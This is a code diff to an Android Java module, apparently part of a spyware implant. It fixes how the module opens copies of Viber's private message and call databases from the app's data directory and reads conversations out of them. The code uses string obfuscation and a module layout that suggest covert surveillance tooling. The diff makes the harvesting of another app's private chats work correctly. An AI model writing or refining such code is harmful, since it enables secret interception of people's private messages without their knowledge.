@@ -28,7 +28,7 @@ public class ChatViber extends SubModuleChat {
 	private static final String TAG = "ChatViber";
 
 	private static final int PROGRAM = 0x09;
-	String pObserving = M.e("com.viber");
+	String pObserving = M.e("com.viber.voip");
 
 	static String dbDir = M.e("/data/data/com.viber.voip/databases");
 	static String dbChatFile = M.e("viber_messages");
@@ -120,7 +120,7 @@ public class ChatViber extends SubModuleChat {
 		try {
 			boolean updateMarkup = false;
 
-			GenericSqliteHelper helper = openViberDBHelper();
+			GenericSqliteHelper helper = openViberDBHelperChat();
 			if (helper == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbChatFile);
@@ -170,8 +170,12 @@ public class ChatViber extends SubModuleChat {
 		}
 	}
 
-	public static GenericSqliteHelper openViberDBHelper() {
+	public static GenericSqliteHelper openViberDBHelperCall() {
 		return GenericSqliteHelper.openCopy(dbDir, dbCallFile);
+	}
+	
+	public static GenericSqliteHelper openViberDBHelperChat() {
+		return GenericSqliteHelper.openCopy(dbDir, dbChatFile);
 	}
 
 	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account,
@@ -268,6 +272,7 @@ public class ChatViber extends SubModuleChat {
 					String address = cursor.getString(4);
 					boolean incoming = cursor.getInt(5) == 0;
 
+					// localtime or gmt? should be converted to gmt
 					Date date = new Date(timestamp);
 
 					if (Cfg.DEBUG) {
